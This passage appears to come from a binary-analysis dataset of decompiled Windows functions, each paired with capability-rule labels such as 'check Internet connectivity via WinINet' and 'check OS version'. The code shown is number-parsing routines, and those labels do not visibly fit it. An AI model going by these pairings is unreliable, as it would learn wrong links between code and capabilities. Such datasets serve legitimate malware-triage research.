uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar25 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar25 == 0x40) {\n        uVar22 = 8;\ncode_r0x000140054a48:\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140054a67:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (bVar27 = false,  *(iVar13 + 0x96) == uVar11)) {\n                bVar27 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x000140054d82;\n                    goto code_r0x000140054aa6;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140054aa6;\ncode_r0x000140054d82:\n                fcn.1400960e0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140024020(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.1400240d0(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x000140054aa6;\n                }\n                iVar23 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140054aa6:\n                iVar23 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar22 == 10;\n                        if (!bVar3) goto code_r0x000140054ad9;\n                        bVar26 = uVar22 == 8;\n                        if (bVar26 || uVar25 == 0) {\n                            iVar23 = 0;\n                            uVar22 = 8;\n                            bVar3 = bVar26 || uVar25 == 0;\n                        }\n                        else {\n                            iVar23 = iVar23 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140054ad9:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140054b82;\n                        }\n                        uVar7 = uVar22 == 0x10 || uVar25 == 0;\n                        if (uVar22 != 0x10 && uVar25 != 0) {\n                            bVar3 = true;\n                            goto code_r0x000140054b8c;\n                        }\n                        iVar23 = 0;\n                        uVar22 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140054b42;\ncode_r0x000140054ff0:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140054ff0;\ncode_r0x000140054b42:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar26 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar26)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar26 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar26) {\n                        uVar7 = 1;\n                        goto code_r0x000140054b82;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140054b82:\n            if (uVar22 == 0x10) goto code_r0x000140054df1;\n        }\n        else {\n            bVar27 = false;\n            uVar11 = 0;\n            iVar23 = 0;\n            bVar3 = false;\n        }\ncode_r0x000140054b8c:\n        iStack160 = uVar22;\n        uVar25 = uVar22;\n    }\n    else {\n        uVar22 = 10;\n        if (uVar25 != 8) goto code_r0x000140054a48;\n        uVar22 = 0x10;\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140054a67;\n        bVar27 = false;\n        uVar11 = 0;\n        iVar23 = 0;\n        bVar3 = false;\ncode_r0x000140054df1:\n        iStack160 = 0x16;\n        uVar25 = 0x10;\n        uVar22 = 0x16;\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar19 = uVar25;\n    uVar15 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(uVar19), 0);\n    uVar2 = *(iVar13 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar24 = 0;\n        if (uVar7 == 0) {\n            uVar16 = 0;\ncode_r0x000140054c04:\n            uVar25 = uVar11;\n            if (uVar22 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack160 + 0x30U <= uVar11)) goto code_r0x000140054ed0;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x000140055074;\n                iVar12 = uVar25 - 0x57;\n                goto code_r0x000140054c29;\n            }\n            iVar12 = uVar25 - 0x30;\ncode_r0x000140054c29:\n            do {\n                piVar4 = piStack104;\n                if (uVar15 < uVar16) {\n                    uVar24 = 1;\n                }\n                else {\n                    uVar21 = uVar16 * uVar19;\n                    uVar16 = iVar12 + uVar21;\n                    iVar23 = iVar23 + 1;\n                    uVar24 = uVar24 | CARRY8(iVar12, uVar21);\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar17 = piStack104[2] + 1;\n                    piStack104[2] = piVar17;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar17 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar17 < piVar14) {\n                    iVar10 = *piVar17;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar26 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar26)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar26 = iVar9 == -1;\n                }\n                if ((iVar10 == -1) == bVar26) {\n                    uVar2 = 1;\n                    goto code_r0x000140054cc0;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x000140054c04;\n                    piStack104 = NULL;\n                }\n                if (uVar22 < 0xb) goto code_r0x000140054ed0;\n                uVar25 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x000140055074:\n                if (5 < uVar11 - 0x41) goto code_r0x000140054ed0;\n                iVar12 = uVar25 - 0x37;\n            } while( true );\n        }\n        uVar16 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar24 = 0;\n            uVar16 = 0;\ncode_r0x0001400550b0:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar18 = iVar13 + 0x9c;\n                iVar20 = iStack160;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140054ed0;\n                while (uVar11 != *puVar18) {\n                    iVar20 = iVar20 + -1;\n                    puVar18 = puVar18 + 1;\n                    if (iVar20 == 0) goto code_r0x000140054ed0;\n                }\n                iVar12 = puVar18 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar16 <= uVar15) {\n                    uVar21 = uVar16 * uVar19;\n                    uVar16 = iVar12 + uVar21;\n                    iVar23 = iVar23 + 1;\n                    uVar6 = uVar24 | CARRY8(iVar12, uVar21);\n                }\n            }\n            else {\n                if (iVar23 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x000140054cc0;\n                }\n                fcn.140077ac0(aiStack80, iVar23);\n                iVar23 = 0;\n                uVar6 = uVar24;\n            }\n            uVar24 = uVar6;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar17 = piStack104[2] + 1;\n                piStack104[2] = piVar17;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar17 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar17 < piVar14) {\n                iVar10 = *piVar17;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar26 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar26)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar26 = iVar9 == -1;\n            }\n            if ((iVar10 == -1) == bVar26) goto code_r0x000140054cc0;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x0001400550b0;\n        }\n        uVar16 = 0;\n        uVar24 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x000140054cc0:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140054ee5;\ncode_r0x000140054cd0:\n    if ((iVar23 != 0) || (bVar3)) {\ncode_r0x000140054f29:\n        if (uVar7 == 0) {\n            if (uVar24 == 0) {\n                if (bVar27) {\n                    uVar16 = -uVar16;\n                }\n                *in_stack_00000038 = uVar16;\n            }\n            else {\n                *in_stack_00000038 = 0xffffffffffffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140054d00;\n        }\n    }\n    goto code_r0x000140054ce3;\ncode_r0x000140054ed0:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140054cd0;\ncode_r0x000140054ee5:\n    fcn.140077ac0(aiStack80, iVar23);\n    cVar8 = fcn.1400b15c0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar23 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140054f29;\ncode_r0x000140054ce3:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140054d00:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar23 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar23 == 0) {\n        iVar23 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar23 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar23 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar23 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4565
    },
    "14005548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140055480(uint *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int64_t *piVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    int16_t iVar7;\n    int16_t iVar8;\n    int16_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    ulong arg2;\n    int64_t iVar14;\n    uint64_t uVar15;\n    int32_t iVar16;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint8_t uVar17;\n    uint8_t uVar18;\n    uint8_t uVar19;\n    bool bVar20;\n    int64_t in_stack_00000028;\n    uint *in_stack_00000030;\n    int64_t *in_stack_00000038;\n    uint8_t uStack145;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    ulong uStack104;\n    uint uStack96;\n    uint uStack92;\n    int64_t aiStack80 [2];\n    \n    uStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar10 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar4 = fcn.140024020(&uStack104, &piStack120);\n    if (uVar4 == 0) {\n        iVar7 = fcn.1400240d0(&uStack104);\n        iVar8 = *(iVar10 + 0x96);\n        cVar5 = *(iVar10 + 0x20);\n        if (iVar8 == iVar7) {\n            if (cVar5 == '\\0') {\n                uVar15 = 0x2b;\n                iVar8 = *(iVar10 + 0x48);\n                goto joined_r0x0001400560d8;\n            }\ncode_r0x00014005601a:\n            if ((*(iVar10 + 0x4a) == iVar7) || (*(iVar10 + 0x48) == iVar7)) goto code_r0x000140055db8;\n            uVar15 = (iVar8 != iVar7) + 0x2b + (iVar8 != iVar7);\n        }\n        else {\n            if (*(iVar10 + 0x94) != iVar7) goto code_r0x000140055db8;\n            if (cVar5 != '\\0') goto code_r0x00014005601a;\n            uVar15 = 0x2d;\n            iVar8 = *(iVar10 + 0x48);\njoined_r0x0001400560d8:\n            if (iVar7 == iVar8) goto code_r0x000140055db8;\n        }\n        fcn.140077ac0(in_stack_00000038, uVar15);\n        fcn.1400960e0(uStack104);\n        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n        uVar19 = fcn.140024020(&uStack104, &piStack120);\n        if (uVar19 == 0) {\n            iVar7 = fcn.1400240d0(&uStack104);\n            cVar5 = *(iVar10 + 0x20);\ncode_r0x000140055db8:\n            piVar2 = *0x140102a70;\n            uVar17 = 0;\n            iVar16 = 0;\n            do {\n                if ((((cVar5 != '\\0') && (uVar19 = uVar4,  *(iVar10 + 0x4a) == iVar7)) ||\n                    (uVar19 = uVar4,  *(iVar10 + 0x48) == iVar7)) || (*(iVar10 + 0x9c) != iVar7))\n                goto code_r0x000140055500;\n                if (uVar17 == 0) {\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x000140055ec0:\n                        fcn.140077810(in_stack_00000038, uVar15);\n                    }\n                    else {\n                        if (*piVar2 == 0) {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        else {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        if (0 < iVar1) goto code_r0x000140055ec0;\n                    }\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x30;\n                    iVar11 = *in_stack_00000038;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + 1 + iVar14) = 0;\n                }\n                piVar3 = uStack104;\n                iVar16 = iVar16 + 1;\n                if (uStack104[2] < uStack104[3]) {\n                    piVar13 = uStack104[2] + 1;\n                    uStack104[2] = piVar13;\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar13 < uStack104[3]) goto code_r0x000140055e27;\ncode_r0x000140055f60:\n                    iVar8 = (**(*piVar3 + 0x48))(piVar3);\n                }\n                else {\n                    (**(*uStack104 + 0x50))(uStack104);\n                    piVar13 = piVar3[2];\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar3[3] <= piVar13) goto code_r0x000140055f60;\ncode_r0x000140055e27:\n                    iVar8 = *piVar13;\n                }\n                if (iVar8 == -1) {\n                    uStack104 = NULL;\n                }\n                bVar20 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar20)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar20 = iVar9 == -1;\n                }\n                if (bVar20 == (iVar8 == -1)) goto code_r0x000140055e5e;\n                iVar7 = -1;\n                if (uStack104 != NULL) {\n                    if (uStack104[2] < uStack104[3]) {\n                        iVar7 = *uStack104[2];\n                    }\n                    else {\n                        iVar7 = (**(*uStack104 + 0x48))();\n                    }\n                    if (iVar7 == -1) {\n                        uStack104 = NULL;\n                    }\n                }\n                cVar5 = *(iVar10 + 0x20);\n                uVar17 = 1;\n            } while( true );\n        }\n        uVar17 = 0;\n        iVar16 = 0;\n    }\n    else {\n        iVar7 = 0;\n        iVar16 = 0;\n        uVar17 = 0;\n        uVar19 = uVar4;\n    }\n    goto code_r0x000140055500;\ncode_r0x000140055aa1:\n    if (uStack104 == NULL) {\n        iVar7 = -1;\n    }\n    else {\n        if (uStack104[2] < uStack104[3]) {\n            iVar7 = *uStack104[2];\n        }\n        else {\n            iVar7 = (**(*uStack104 + 0x48))();\n        }\n        if (iVar7 == -1) {\n            uStack104 = NULL;\n        }\n    }\n    iVar8 = *(iVar10 + 0x96);\n    uVar6 = *(iVar10 + 0x20);\n    if ((((iVar8 != iVar7) && (uVar19 = uVar18,  uVar17 = uVar18,  *(iVar10 + 0x94) != iVar7)) ||\n        ((uVar6 != 0 && (uVar19 = uVar6,  uVar17 = uVar6,  *(iVar10 + 0x4a) == iVar7)))) ||\n       (uVar19 = uVar18,  uVar17 = uVar18,  *(iVar10 + 0x48) == iVar7)) goto code_r0x000140055720;\n    fcn.140077ac0(in_stack_00000038, (iVar8 != iVar7) + 0x2b + (iVar8 != iVar7));\ncode_r0x0001400557c9:\n    piVar3 = uStack104;\n    if (uStack104[2] < uStack104[3]) {\n        piVar13 = uStack104[2] + 1;\n        uStack104[2] = piVar13;\n        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n        if (uStack104[3] <= piVar13) {\ncode_r0x000140055ca8:\n            iVar7 = (**(*piVar3 + 0x48))(piVar3);\n            goto joined_r0x000140055801;\n        }\n    }\n    else {\n        (**(*uStack104 + 0x50))(uStack104);\n        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n        piVar13 = piVar3[2];\n        if (piVar3[3] <= piVar13) goto code_r0x000140055ca8;\n    }\n    iVar7 = *piVar13;\njoined_r0x000140055801:\n    if (iVar7 == -1) {\n        uStack104 = NULL;\n    }\n    bVar20 = uStack112 == -1;\n    if ((piStack120 != NULL) && (bVar20)) {\n        if (piStack120[2] < piStack120[3]) {\n            iVar8 = *piStack120[2];\n        }\n        else {\n            iVar8 = (**(*piStack120 + 0x48))();\n        }\n        if (iVar8 == -1) {\n            piStack120 = NULL;\n        }\n        bVar20 = iVar8 == -1;\n    }\n    if ((iVar7 == -1) == bVar20) goto code_r0x00014005583a;\n    if (uStack104 == NULL) {\n        uVar6 = *(iVar10 + 0x20);\n        iVar7 = -1;\n    }\n    else {\n        if (uStack104[2] < uStack104[3]) {\n            iVar7 = *uStack104[2];\n        }\n        else {\n            iVar7 = (**(*uStack104 + 0x48))();\n        }\n        if (iVar7 == -1) {\n            uStack104 = NULL;\n        }\n        uVar6 = *(iVar10 + 0x20);\n    }\n    goto code_r0x000140055720;\ncode_r0x000140056098:\n    iVar11 = aiStack80[0];\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140055890;\n    goto code_r0x00014005586e;\ncode_r0x000140055e5e:\n    uVar17 = 1;\n    uVar19 = 1;\ncode_r0x000140055500:\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar10 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar4 = *(iVar10 + 200);\n    if (uVar4 == 0) {\n        if (uVar19 == 0) {\n            uStack145 = 0;\ncode_r0x000140055550:\n            do {\n                if (9 < iVar7 - 0x30U) goto code_r0x000140055656;\n                iVar11 = *in_stack_00000038;\n                iVar14 = *(iVar11 + -0x18);\n                uVar15 = iVar14 + 1;\n                if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005558c:\n                    fcn.140077810(in_stack_00000038, uVar15);\n                }\n                else {\n                    if (**0x140102a70 == 0) {\n                        iVar1 = *(iVar11 + -8);\n                    }\n                    else {\n                        iVar1 = *(iVar11 + -8);\n                    }\n                    if (0 < iVar1) goto code_r0x00014005558c;\n                }\n                *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = iVar7;\n                iVar11 = *in_stack_00000038;\n                *(iVar11 + -8) = 0;\n                *(iVar11 + -0x18) = uVar15;\n                *(iVar11 + 1 + iVar14) = 0;\n                uVar17 = 1;\ncode_r0x0001400555bc:\n                piVar3 = uStack104;\n                if (uStack104[2] < uStack104[3]) {\n                    piVar13 = uStack104[2] + 1;\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    uStack104[2] = piVar13;\n                    if (piVar13 < uStack104[3]) goto code_r0x0001400555e9;\ncode_r0x000140055c20:\n                    iVar7 = (**(*piVar3 + 0x48))(piVar3);\n                }\n                else {\n                    (**(*uStack104 + 0x50))(uStack104);\n                    piVar13 = piVar3[2];\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar3[3] <= piVar13) goto code_r0x000140055c20;\ncode_r0x0001400555e9:\n                    iVar7 = *piVar13;\n                }\n                if (iVar7 == -1) {\n                    uStack104 = NULL;\n                }\n                bVar20 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar20)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar8 = *piStack120[2];\n                    }\n                    else {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar8 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar20 = iVar8 == -1;\n                }\n                if ((iVar7 == -1) == bVar20) goto code_r0x00014005583a;\n                if (uStack104 != NULL) {\n                    if (uStack104[2] < uStack104[3]) {\n                        iVar7 = *uStack104[2];\n                    }\n                    else {\n                        iVar7 = (**(*uStack104 + 0x48))();\n                    }\n                    if (iVar7 != -1) goto code_r0x000140055550;\n                    uStack104 = NULL;\ncode_r0x000140055656:\n                    if ((*(iVar10 + 0x48) == iVar7) && ((uStack145 | uVar19) == 0)) {\n                        uStack145 = 1;\n                        fcn.140077ac0(in_stack_00000038, 0x2e);\n                        uVar19 = 0;\n                    }\n                    else {\n                        if (((*(iVar10 + 0xb8) != iVar7) && (*(iVar10 + 0xc4) != iVar7)) ||\n                           (uVar17 = uVar17 & (uVar19 ^ 1),  uVar17 == 0)) goto code_r0x00014005583a;\n                        fcn.140077ac0(in_stack_00000038, 0x65);\n                        fcn.1400960e0(uStack104);\n                        uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                        cVar5 = fcn.140024020(&uStack104, &piStack120);\n                        if (cVar5 != '\\0') goto code_r0x000140056098;\n                        iVar7 = fcn.1400240d0(&uStack104);\n                        uVar19 = uVar17;\n                        if (iVar7 == *(iVar10 + 0x96)) {\n                            arg2 = 0x2b;\n                        }\n                        else {\n                            arg2 = 0x2d;\n                            if (iVar7 != *(iVar10 + 0x94)) goto code_r0x000140055550;\n                        }\n                        fcn.140077ac0(in_stack_00000038, arg2);\n                    }\n                    goto code_r0x0001400555bc;\n                }\n                iVar7 = -1;\n            } while( true );\n        }\ncode_r0x00014005614b:\n        iVar11 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140055890;\ncode_r0x000140055858:\n        fcn.140077ac0(aiStack80, iVar16);\n    }\n    else {\n        if (uVar19 != 0) goto code_r0x00014005614b;\n        uStack145 = 0;\n        uVar6 = *(iVar10 + 0x20);\ncode_r0x000140055720:\n        cVar5 = iVar16;\n        if ((uVar6 == 0) || (*(iVar10 + 0x4a) != iVar7)) {\n            piVar13 = iVar10 + 0x9c;\n            if (*(iVar10 + 0x48) == iVar7) {\n                uVar19 = uVar19 | uStack145;\n                if (uVar19 == 0) {\n                    if (*(aiStack80[0] + -0x18) != 0) {\n                        fcn.140077ac0(aiStack80, cVar5);\n                    }\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005592c:\n                        fcn.140077810(in_stack_00000038, uVar15);\n                    }\n                    else {\n                        if (**0x140102a70 == 0) {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        else {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        if (0 < iVar1) goto code_r0x00014005592c;\n                    }\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x2e;\n                    iVar11 = *in_stack_00000038;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + 1 + iVar14) = 0;\n                    uStack145 = uVar4;\n                    goto code_r0x0001400557c9;\n                }\n                goto code_r0x000140056098;\n            }\n            do {\n                if (iVar7 == *piVar13) {\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x00014005579b:\n                        fcn.140077810(in_stack_00000038, uVar15);\ncode_r0x0001400557a6:\n                        iVar11 = *in_stack_00000038;\n                        iVar14 = *(iVar11 + -0x18);\n                    }\n                    else {\n                        if (**0x140102a70 != 0) {\n                            if (0 < *(iVar11 + -8)) goto code_r0x00014005579b;\n                            goto code_r0x0001400557a6;\n                        }\n                        if (0 < *(iVar11 + -8)) goto code_r0x00014005579b;\n                    }\n                    *(iVar11 + iVar14) = (piVar13 - (iVar10 + 0x9c) >> 1) + '0';\n                    iVar11 = *in_stack_00000038;\n                    iVar16 = iVar16 + 1;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + uVar15) = 0;\n                    uVar17 = uVar4;\n                    goto code_r0x0001400557c9;\n                }\n                piVar13 = piVar13 + 1;\n            } while (iVar10 + 0xb0 != piVar13);\n            if ((*(iVar10 + 0xb8) == iVar7) || (*(iVar10 + 0xc4) == iVar7)) {\n                uVar18 = uVar17 & (uVar19 ^ 1);\n                if (uVar18 != 0) {\n                    if ((*(aiStack80[0] + -0x18) != 0) && (uStack145 == 0)) {\n                        fcn.140077ac0(aiStack80, cVar5);\n                    }\n                    iVar11 = *in_stack_00000038;\n                    iVar14 = *(iVar11 + -0x18);\n                    uVar15 = iVar14 + 1;\n                    if (*(iVar11 + -0x10) < uVar15) {\ncode_r0x000140055a0a:\n                        fcn.140077810(in_stack_00000038, uVar15);\n                    }\n                    else {\n                        if (**0x140102a70 == 0) {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        else {\n                            iVar1 = *(iVar11 + -8);\n                        }\n                        if (0 < iVar1) goto code_r0x000140055a0a;\n                    }\n                    piVar3 = uStack104;\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x65;\n                    iVar11 = *in_stack_00000038;\n                    *(iVar11 + -0x18) = uVar15;\n                    *(iVar11 + -8) = 0;\n                    *(iVar11 + 1 + iVar14) = 0;\n                    piVar13 = uStack104[3];\n                    if (uStack104[2] < piVar13) {\n                        piVar12 = uStack104[2] + 1;\n                        uStack104[2] = piVar12;\n                    }\n                    else {\n                        (**(*uStack104 + 0x50))(uStack104);\n                        piVar12 = piVar3[2];\n                        piVar13 = piVar3[3];\n                    }\n                    uStack96 = CONCAT22(uStack96._2_2_, 0xffff);\n                    if (piVar12 < piVar13) {\n                        iVar7 = *piVar12;\n                    }\n                    else {\n                        iVar7 = (**(*piVar3 + 0x48))(piVar3);\n                    }\n                    if (iVar7 == -1) {\n                        uStack104 = NULL;\n                    }\n                    bVar20 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar20)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar8 = *piStack120[2];\n                        }\n                        else {\n                            iVar8 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar8 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar20 = iVar8 